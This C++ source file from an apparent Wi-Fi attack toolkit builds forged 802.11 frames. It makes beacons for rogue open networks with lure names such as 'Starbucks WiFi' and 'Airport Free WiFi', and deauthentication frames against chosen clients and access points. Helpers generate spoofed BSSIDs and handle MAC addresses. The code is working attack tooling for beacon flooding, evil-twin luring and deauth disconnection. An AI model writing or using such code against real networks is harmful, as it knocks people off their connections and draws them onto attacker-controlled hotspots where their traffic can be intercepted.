#include "wifi_attack.h"

#include <cstdio>
#include <cstring>

namespace wifiAttack {

namespace {

constexpr uint8_t kFcBeacon0 = 0x80; // management / beacon
constexpr uint8_t kFcDeauth0 = 0xC0; // management / deauthentication
constexpr uint16_t kCapabilityOpenEss = 0x0001;
constexpr uint16_t kBeaconIntervalTu = 100;

// Lure names rotated by lureSsid(); a fixed table keeps the SSID stream
// deterministic (and therefore testable) instead of relying on rand().
const char *const kLureNames[] = {
    "Free WiFi",  "FreeWiFi",       "Starbucks WiFi", "Airport Free WiFi",
    "Hotel Guest", "Cafe Free WiFi", "Public WiFi",    "Guest Network",
};
constexpr size_t kLureNameCount = sizeof(kLureNames) / sizeof(kLureNames[0]);

void putLe16(uint8_t *p, uint16_t value) {
    p[0] = static_cast<uint8_t>(value & 0xFF);
    p[1] = static_cast<uint8_t>((value >> 8) & 0xFF);
}

uint8_t hexNibble(char c) {
    if (c >= '0' && c <= '9') return static_cast<uint8_t>(c - '0');
    if (c >= 'a' && c <= 'f') return static_cast<uint8_t>(c - 'a' + 10);
    if (c >= 'A' && c <= 'F') return static_cast<uint8_t>(c - 'A' + 10);
    return 0xFF;
}

} // namespace

void deriveBssid(uint32_t index, uint8_t out[6]) {
    out[0] = 0x02; // locally administered, unicast
    out[1] = 0x1A;
    out[2] = 0x11;
    const uint32_t mixed = index * 2654435761u; // Knuth multiplicative hash
    out[3] = static_cast<uint8_t>((mixed >> 16) & 0xFF);
    out[4] = static_cast<uint8_t>((mixed >> 8) & 0xFF);
    out[5] = static_cast<uint8_t>(mixed & 0xFF);
}

size_t lureSsid(uint32_t index, char *out, size_t cap) {
    if (out == nullptr || cap == 0) return 0;
    const char *base = kLureNames[index % kLureNameCount];
    const uint32_t suffix = index / kLureNameCount;
    const int written = (suffix == 0) ? snprintf(out, cap, "%s", base)
                                      : snprintf(out, cap, "%s-%u", base, static_cast<unsigned>(suffix));
    if (written <= 0 || static_cast<size_t>(written) >= cap) return 0;
    if (static_cast<size_t>(written) > kMaxSsidBytes) return 0;
    return static_cast<size_t>(written);
}

size_t buildBeacon(const uint8_t bssid[6], uint8_t channel, const char *ssid, size_t ssidLen, uint32_t sequence,
                   uint8_t *out, size_t cap) {
    if (bssid == nullptr || out == nullptr) return 0;
    if (ssidLen > kMaxSsidBytes) return 0;
    if (ssidLen != 0 && ssid == nullptr) return 0;
    const size_t total = 24 + 12 + 2 + ssidLen + 6 + 3;
    if (cap < total) return 0;

    size_t o = 0;
    out[o++] = kFcBeacon0;
    out[o++] = 0x00;
    out[o++] = 0x00; // duration
    out[o++] = 0x00;
    std::memcpy(out + o, kBroadcastMac, 6); // DA
    o += 6;
    std::memcpy(out + o, bssid, 6); // SA
    o += 6;
    std::memcpy(out + o, bssid, 6); // BSSID
    o += 6;
    putLe16(out + o, static_cast<uint16_t>((sequence << 4) & 0xFFF0)); // sequence control
    o += 2;
    for (int i = 0; i < 8; ++i) out[o++] = 0x00; // timestamp
    putLe16(out + o, kBeaconIntervalTu);
    o += 2;
    putLe16(out + o, kCapabilityOpenEss);
    o += 2;

    out[o++] = 0x00; // SSID IE
    out[o++] = static_cast<uint8_t>(ssidLen);
    if (ssidLen != 0) std::memcpy(out + o, ssid, ssidLen);
    o += ssidLen;

    out[o++] = 0x01; // supported rates (basic 1/2/5.5/11)
    out[o++] = 0x04;
    out[o++] = 0x82;
    out[o++] = 0x84;
    out[o++] = 0x8B;
    out[o++] = 0x96;

    out[o++] = 0x03; // DS parameter set
    out[o++] = 0x01;
    out[o++] = channel;

    return o;
}

size_t buildDeauth(const uint8_t dest[6], const uint8_t src[6], const uint8_t bssid[6], uint16_t reason,
                   uint8_t *out, size_t cap) {
    if (dest == nullptr || src == nullptr || bssid == nullptr || out == nullptr) return 0;
    if (cap < kDeauthBytes) return 0;

    size_t o = 0;
    out[o++] = kFcDeauth0;
    out[o++] = 0x00;
    out[o++] = 0x00; // duration
    out[o++] = 0x00;
    std::memcpy(out + o, dest, 6);
    o += 6;
    std::memcpy(out + o, src, 6);
    o += 6;
    std::memcpy(out + o, bssid, 6);
    o += 6;
    putLe16(out + o, 0x0000); // sequence control
    o += 2;
    putLe16(out + o, reason);
    o += 2;
    return o;
}

bool parseMac(std::string_view text, uint8_t out[6]) {
    if (text.size() != 17) return false;
    const uint8_t zero = 0;
    (void)zero;
    for (size_t i = 0; i < 6; ++i) {
        const size_t base = i * 3;
        if (i != 5) {
            const char sep = text[base + 2];
            if (sep != ':' && sep != '-') return false;
        }
        const uint8_t hi = hexNibble(text[base]);
        const uint8_t lo = hexNibble(text[base + 1]);
        if (hi == 0xFF || lo == 0xFF) return false;
        out[i] = static_cast<uint8_t>((hi << 4) | lo);
    }
    return true;
}

bool formatMac(const uint8_t mac[6], char *out, size_t cap) {
    if (mac == nullptr || out == nullptr || cap < kMacTextBytes) return false;
    snprintf(out, cap, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return true;
}

} // namespace wifiAttack
